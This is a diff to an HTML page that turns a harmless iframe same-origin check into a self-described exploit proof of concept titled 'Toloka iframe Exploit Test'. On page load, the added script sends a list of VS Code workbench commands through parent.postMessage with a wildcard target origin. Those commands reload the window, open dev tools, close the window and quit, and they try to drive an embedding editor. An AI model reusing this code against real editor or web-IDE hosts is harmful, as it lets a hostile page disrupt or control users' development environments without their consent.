@@ -1,23 +1,36 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h1>Testing iframe same-origin chain</h1>
-    <script>
-      function testParent() {
-        try {
-          const sameOrigin = window.parent.location.origin === window.location.origin;
-          if (sameOrigin) {
-            alert("✅ Parent is same-origin!");
-            console.log("Parent document title: ", window.parent.document.title);
-          } else {
-            alert("❌ Parent is cross-origin.");
-          }
-        } catch (e) {
-          alert("⚠️ Cannot access parent: " + e.message);
-        }
-      }
+<head>
+  <title>🔥 Toloka iframe Exploit Test</title>
+  <script>
+    const commands = [
+      "workbench.action.reloadWindow",
+      "workbench.action.toggleDevTools",
+      "workbench.action.toggleFullScreen",
+      "workbench.action.closeWindow",
+      "workbench.action.quit",
+      "workbench.action.showCommands",
+      "workbench.action.toggleSidebarVisibility",
+      "workbench.action.toggleZenMode"
+    ];
 
-      testParent();
-    </script>
-  </body>
+    function sendCommands() {
+      for (const cmd of commands) {
+        const msg = {
+          type: "command",
+          command: cmd
+        };
+        console.log("🚀 إرسال الأمر:", cmd);
+        parent.postMessage(msg, "*");
+      }
+    }
+
+    window.onload = () => {
+      setTimeout(sendCommands, 1000);
+    };
+  </script>
+</head>
+<body>
+  <h1>🚀 PoC تشغيل أوامر VSCode</h1>
+</body>
 </html>
